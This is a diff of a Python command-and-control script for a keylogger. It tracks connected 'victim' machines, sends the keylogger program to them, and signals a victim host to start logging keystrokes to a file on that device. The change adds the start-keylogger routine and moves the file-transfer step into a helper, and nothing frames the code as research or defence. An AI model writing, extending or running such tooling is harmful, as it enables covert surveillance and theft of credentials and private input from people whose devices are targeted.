@@ -1,4 +1,3 @@
-import hashlib
 import select
 from commander_utils import *
 
@@ -18,8 +17,7 @@ if __name__ == '__main__':
 
     # Initial connect to victim as passed by argument (and put in sockets_to_read)
     print_config(destination_ip, destination_port, (source_ip, source_port))
-    is_connected, victim_socket = initial_connect_to_client(sockets_to_read, connected_clients,
-                                                            destination_ip, destination_port)
+    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip, destination_port)
 
     # Display Menu
     display_menu()
@@ -35,33 +33,84 @@ if __name__ == '__main__':
             # a) Handle new connections
             if sock is server_socket:
                 # This means there is a new incoming connection
-                client_socket, client_address = server_socket.accept()
-                print(constants.NEW_CONNECTION_MSG.format(client_address))
-                sockets_to_read.append(client_socket)
-                connected_clients[client_socket] = client_address
+                process_new_connections(server_socket, sockets_to_read, connected_clients)
 
             # b) Read from stdin file descriptor (Initiate Menu from keystroke)
             elif sock is sys.stdin:
+                # MENU ITEM 1 - Start Keylogger
+                if command == constants.PERFORM_MENU_ITEM_ONE:
+                    print(constants.START_KEYLOG_INITIAL_MSG)
+
+                    # a) Check if client list is empty
+                    if len(connected_clients) == constants.ZERO:
+                        print(constants.CLIENT_LIST_EMPTY_ERROR)
+
+                    # b) Handle single client in client list
+                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
+                        # Get client socket
+                        client_socket, (ip, port) = next(iter(connected_clients.items()))
+
+                        # Send signal to start keylog
+                        print(constants.START_SEND_SIGNAL_MSG.format(constants.KEYLOG_FILE_NAME, ip, port))
+                        client_socket.send(constants.START_KEYLOG_MSG.encode())
+
+                        # Await OK signal from client
+                        print(constants.AWAIT_START_RESPONSE_MSG)
+                        ack = client_socket.recv(constants.BYTE_LIMIT).decode()
+
+                        #  i) Check if keylogger.py is in victim's directory
+                        try:
+                            if ack == constants.RECEIVED_CONFIRMATION_MSG:
+                                print(constants.START_SIGNAL_RECEIVED_MSG.format(constants.KEYLOG_FILE_NAME))
+                                client_socket.send(constants.CHECK_KEYLOG.encode())
+
+                                print(constants.START_SIGNAL_SEND_FILE_NAME.format(constants.KEYLOG_FILE_NAME))
+                                client_socket.send(constants.KEYLOG_FILE_NAME.encode())
+
+                                # Get status
+                                print(constants.AWAIT_START_RESPONSE_MSG)
+                                status = client_socket.recv(constants.BYTE_LIMIT).decode()
+                                msg = client_socket.recv(constants.BYTE_LIMIT).decode()
+
+                                if status == constants.STATUS_TRUE:
+                                    print(constants.CLIENT_RESPONSE.format(msg))
+
+                                    # Send signal to victim to start
+                                    print(constants.START_SIGNAL_EXECUTE_KEYLOG.format(constants.KEYLOG_FILE_NAME))
+                                    client_socket.send(constants.START_KEYLOG_MSG.encode())
+
+                                    # Awaiting Response
+                                    msg = client_socket.recv(constants.BYTE_LIMIT).decode()
+                                    print(constants.CLIENT_RESPONSE.format(msg))
+
+                                    # Await Result
+                                    result = client_socket.recv(constants.BYTE_LIMIT).decode()
+
+                                    if result == constants.STATUS_TRUE:
+                                        print("[+] OPERATION SUCCESSFUL: Keylog file saved on client/victim device!")
+                                    else:
+                                        print(f"[+] ERROR: An error has occurred during execution of "
+                                              f"keylogger: ")
+
+                                    # Get user to hit menu item "2" to stop keylogger (WHILE LOOP?)
+                                    signal_to_stop = False
+
+                                else:
+                                    print(constants.CLIENT_RESPONSE.format(msg))
+                                    print(constants.MISSING_KEYLOG_FILE_MSG)
+
+                        except Exception as e:
+                            print(constants.KEYLOG_FILE_CHECK_ERROR.format(constants.KEYLOG_FILE_NAME, e))
+
+                    # c) Handle any specific connected client in client list
+
+                # MENU ITEM 2 - Stop Keylogger
+                if command == constants.PERFORM_MENU_ITEM_TWO:
+                    print(constants.STOP_KEYLOGGER_PROMPT)
+
                 # MENU ITEM 3 - Transfer keylog program to victim
                 if command == constants.PERFORM_MENU_ITEM_THREE:
-                    # To send to initial victim (from command arg)
-                    if is_connected and len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
-                        transfer_file(victim_socket, destination_ip, destination_port)
-
-                    # If connected to no clients => Connect to one and transfer
-                    elif len(connected_clients) == constants.ZERO:
-                        print(constants.NO_CONNECTED_CLIENTS_ERROR)
-
-                    # Send keylogger to any specific connected victim
-                    elif len(connected_clients) != constants.ZERO:
-                        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
-                        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
-                        target_socket, target_ip, target_port = find_specific_client_socket(connected_clients,
-                                                                                            target_ip, target_port)
-                        if target_socket:
-                            transfer_file(target_socket, target_ip, target_port)
-                        else:
-                            print(constants.TARGET_VICTIM_NOT_FOUND)
+                    perform_menu_item_3(connected_clients)
 
                 # MENU ITEM 5 - Disconnect from victim
                 if command == constants.PERFORM_MENU_ITEM_FIVE:
@@ -75,7 +124,7 @@ if __name__ == '__main__':
             #  c) If not server or stdin sockets, then handle data coming from clients
             else:
                 # Data is available to read from an existing client connection
-                data = sock.recv(1024)
+                data = sock.recv(constants.BYTE_LIMIT)
                 if not data:
                     print("[+] Connection closed by", connected_clients[sock])
                     del connected_clients[sock]
